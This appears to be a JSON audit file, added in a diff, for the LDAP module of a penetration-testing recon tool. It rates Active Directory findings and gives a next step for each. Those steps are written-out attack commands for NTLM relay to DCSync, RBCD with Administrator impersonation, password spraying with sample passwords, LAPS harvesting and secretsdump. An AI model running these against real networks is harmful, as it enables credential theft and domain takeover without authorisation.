@@ -1,0 +1,140 @@
+{
+  "service": "ldap",
+  "summary": "LDAP module is the most mature in this tranche: hand-rolled BER/ASN.1 client speaks LDAP raw, does credfree RootDSE + anon bind/read (T1), does full credentialed enumeration (T2/T3 - actual auth to the DC and paged directory dump), detects LAPS-readable and RBCD as bulk-cred / delegation abuse primitives. Biggest gap: does not actually PROVE the LAPS read by decrypting a value (kept as truncated indicator) and does not enumerate ADCS objects (ESC1-8) - the CertifyKit vector lives in ad/adcs.py but is disconnected from the LDAP enum path here.",
+  "module_files": [
+    "recce/services/ldap.py"
+  ],
+  "findings": [
+    {
+      "kind": "ldap_anon_read",
+      "title_pattern": "Anonymous LDAP directory read",
+      "severity": "high",
+      "tier": "t2",
+      "tier_evidence": "recce not only bound anonymously but READ the naming context and returned attribute data - directory disclosure is USED not just probed. Anonymous reads on AD default posture is a real misconfig.",
+      "can_promote_to": "t3",
+      "promotion_notes": "Extend the anon read to paginate objectClass=user with description/servicePrincipalName - the same pass yields kerberoast SPN targets + potential passwords in description for immediate use, giving a first-cred path with zero auth.",
+      "promotion_risk": "low",
+      "tester_next_step": "ldapsearch -x -H ldap://<ip> -b '<nc>' '(&(objectCategory=person)(servicePrincipalName=*))' sAMAccountName servicePrincipalName description; feed sAMAccountName list to impacket-GetNPUsers and kerberoast module; grep description for pass/pwd/secret."
+    },
+    {
+      "kind": "ldap_anon_bind",
+      "title_pattern": "Anonymous LDAP bind allowed",
+      "severity": "info",
+      "tier": "t1",
+      "tier_evidence": "Simple bind with empty creds succeeded - directly observed via LDAP resultCode==0. Correctly downgraded to info since it's AD default (only real when combined with anon_read).",
+      "can_promote_to": "stay",
+      "promotion_notes": "Already info; escalation to real access requires anon_read which is emitted separately.",
+      "promotion_risk": "none",
+      "tester_next_step": "ldapsearch -x -H ldap://<ip>:<port> -s base -b '' '(objectClass=*)'; then try anonymous searches on -b <naming_context>."
+    },
+    {
+      "kind": "ldap_rootdse",
+      "title_pattern": "LDAP RootDSE information disclosure",
+      "severity": "info",
+      "tier": "t1",
+      "tier_evidence": "RootDSE fields (namingContexts, functional levels, dnsHostName, supported SASL) pulled pre-auth - baseline recon by design.",
+      "can_promote_to": "stay",
+      "promotion_notes": "RootDSE is world-readable by design; only value is feeding downstream (kerberos realm, domain/forest for spraying, dc_dns for coerce chain). Ensure it feeds core.known_domains and core.known_hostnames.",
+      "promotion_risk": "none",
+      "tester_next_step": "ldapsearch -x -H ldap://<ip> -s base -b '' '(objectClass=*)' '*' +. Parse defaultNamingContext -> use as -b in follow-on searches."
+    },
+    {
+      "kind": "ldap_cleartext",
+      "title_pattern": "LDAP over cleartext (no TLS on 389)",
+      "severity": "medium",
+      "tier": "t1",
+      "tier_evidence": "389/tcp answered simple bind without TLS - deterministic (port + probe.tls=False). Relay-target condition confirmed.",
+      "can_promote_to": "t3",
+      "promotion_notes": "Chain with a coercion source (msrpc PrinterBug/PetitPotam) + ntlmrelayx -t ldap://<dc> --escalate-user <you> to grant DCSync. Depends on known_relay_targets and known_coerce_sources shared surfaces.",
+      "promotion_risk": "high",
+      "tester_next_step": "impacket-ntlmrelayx.py -t ldap://<dc> --escalate-user <your-lowpriv> --no-smb-server & then Coercer coerce -t <target> -l <you>. On success your account gets DCSync rights.",
+      "related_cves": [
+        "CVE-2017-8563"
+      ]
+    },
+    {
+      "kind": "ldap_weak_sasl_mech",
+      "title_pattern": "Legacy / weak SASL mechanisms offered",
+      "severity": "medium",
+      "tier": "t1",
+      "tier_evidence": "RootDSE supportedSASLMechanisms directly listed ANONYMOUS/DIGEST-MD5/PLAIN/LOGIN etc - direct observation of downgrade-friendly auth surface.",
+      "can_promote_to": "t2",
+      "promotion_notes": "For DIGEST-MD5 attempt a downgrade bind and capture the nonce/response to hashcat-crack offline (John format sapb / dcc). For ANONYMOUS attempt the trace-token bind and prove object visibility.",
+      "promotion_risk": "medium",
+      "tester_next_step": "ldapwhoami -x -H ldap://<ip> -Y DIGEST-MD5 -U <user>; capture wireshark; convert to $sapb$ hashcat 7300; or ldapsearch -x -Y ANONYMOUS -H ldap://<ip> - test what a trace token unlocks."
+    },
+    {
+      "kind": "",
+      "title_pattern": "Authenticated LDAP enumeration",
+      "severity": "info",
+      "tier": "t3",
+      "tier_evidence": "This is USED credentials against the DC: paged directory dump of users + computers + domain object under supplied credential (or NTLM pass-the-hash sealed on 389). Full authenticated foothold on LDAP.",
+      "can_promote_to": "t4",
+      "promotion_notes": "Add BloodHound-python-equivalent SharpHound collection (session/localgroup/ACL edges) into the same auth session; feed graph into ad/bloodhound.py path-finding for domain-takeover walks.",
+      "promotion_risk": "medium",
+      "tester_next_step": "bloodhound-python -u <u> -p <p> -d <domain> -dc <ip> -c All --zip; then upload zip to BloodHound-CE and query 'Shortest Path to Domain Admin'. Also nxc ldap <ip> -u -p --kerberoasting kerb.txt --asreproast asrep.txt."
+    },
+    {
+      "kind": "ldap_maq",
+      "title_pattern": "Machine account quota allows adding computers",
+      "severity": "medium",
+      "tier": "t1",
+      "tier_evidence": "ms-DS-MachineAccountQuota read from domain object with authenticated bind - authoritative value directly observed.",
+      "can_promote_to": "t3",
+      "promotion_notes": "Actually invoke impacket-addcomputer to create a shadow computer account, then request an RBCD ticket to a target computer object. Would require write to msDS-AllowedToActOnBehalfOfOtherIdentity - full RBCD chain implementation.",
+      "promotion_risk": "high",
+      "tester_next_step": "impacket-addcomputer -computer-name 'RECCE$' -computer-pass 'Recce1234' -dc-ip <ip> <domain>/<user>:<pass>; then impacket-rbcd -delegate-from 'RECCE$' -delegate-to <target>$ -action write <domain>/<user>:<pass>; then getST -spn cifs/<target> -impersonate Administrator -dc-ip <ip> <domain>/RECCE$:Recce1234."
+    },
+    {
+      "kind": "ldap_lockout",
+      "title_pattern": "No account lockout threshold (password-spray friendly)",
+      "severity": "medium",
+      "tier": "t1",
+      "tier_evidence": "lockoutThreshold=0 read authoritatively from the domain object - deterministic proof spraying will not lock accounts.",
+      "can_promote_to": "t3",
+      "promotion_notes": "Chain to kerberos.spray() with enumerated user list (already in module) - a spray of Season2025! / Winter2025! against every enum'd user with zero lockout risk. Auto-wire the enumerated user list to kerberos.spray via shared known_users surface.",
+      "promotion_risk": "medium",
+      "tester_next_step": "nxc smb <dc> -u users.txt -p 'Winter2025!' --continue-on-success; or kerbrute passwordspray -d <domain> --dc <ip> users.txt 'Winter2025!' (leaves 4771 not 4625 - stealthier)."
+    },
+    {
+      "kind": "ldap_pw_desc",
+      "title_pattern": "Passwords in LDAP description/comment fields",
+      "severity": "high",
+      "tier": "t2",
+      "tier_evidence": "Authenticated regex match against description attributes returned real accounts with credential-shaped strings. This is proof-of-exposure - the string is captured, not merely inferred.",
+      "can_promote_to": "t3",
+      "promotion_notes": "Extract the actual password candidate and validate it against SMB/WinRM/Kerberos for the same sAMAccountName - closes the loop from 'password-shaped' to 'confirmed credential'. Ties into cred_quickconnect flow.",
+      "promotion_risk": "medium",
+      "tester_next_step": "ldapsearch -x -H ldap://<dc> -D '<u>@<d>' -w '<p>' -b '<base>' '(description=*)' sAMAccountName description; parse; then nxc smb <ip> -u <sam> -p '<extracted-pass>' to validate; if valid: --local-auth escalation checks."
+    },
+    {
+      "kind": "ldap_laps_readable",
+      "title_pattern": "LAPS local-admin passwords readable via LDAP",
+      "severity": "critical",
+      "tier": "t3",
+      "tier_evidence": "Bound principal actually READ ms-Mcs-AdmPwd / msLAPS-Password values - that's a live local-admin credential harvest across the domain. Values are truncated in the finding for hygiene but the READ is proven.",
+      "can_promote_to": "t4",
+      "promotion_notes": "Feed the retrieved LAPS passwords into the shared credential store, then auto-attempt SMB/WinRM/RDP login to each computer -> secretsdump -> credential loop. Would give full domain-wide local-admin sweep.",
+      "promotion_risk": "high",
+      "tester_next_step": "nxc ldap <dc> -u <u> -p <p> -M laps; or ldapsearch ... '(ms-Mcs-AdmPwd=*)' sAMAccountName ms-Mcs-AdmPwd; then for each: impacket-secretsdump 'administrator:<lapspw>@<computer>' -local-auth."
+    },
+    {
+      "kind": "ldap_rbcd",
+      "title_pattern": "Resource-based constrained delegation configured",
+      "severity": "high",
+      "tier": "t2",
+      "tier_evidence": "msDS-AllowedToActOnBehalfOfOtherIdentity presence directly observed on computer objects - RBCD is confirmed configured. Doesn't decode SD trustees so full impact requires manual check.",
+      "can_promote_to": "t3",
+      "promotion_notes": "Parse the SD blob to enumerate trustee SIDs, cross-reference with known_users, and stage the s4u2self+s4u2proxy chain when any trustee is compromised.",
+      "promotion_risk": "medium",
+      "tester_next_step": "python3 -c 'from impacket.ldap.ldaptypes import ...' or use bloodhound-python edge output; then if trustee is compromised: impacket-getST -spn cifs/<target> -impersonate Administrator -dc-ip <dc> <domain>/<trustee>:<pass>."
+    }
+  ],
+  "proposed_shared_surface_consumers": [
+    "known_hostnames (produce dc_dns/dc_fqdn)",
+    "known_domains (produce dns_domain/forest)",
+    "known_users (produce enum'd sAMAccountNames feeding kerberoast + spray)",
+    "known_coerce_sources (consume from msrpc)",
+    "known_relay_targets (produce - ldap:// on unsigned DC is a relay target)"
+  ]
+}
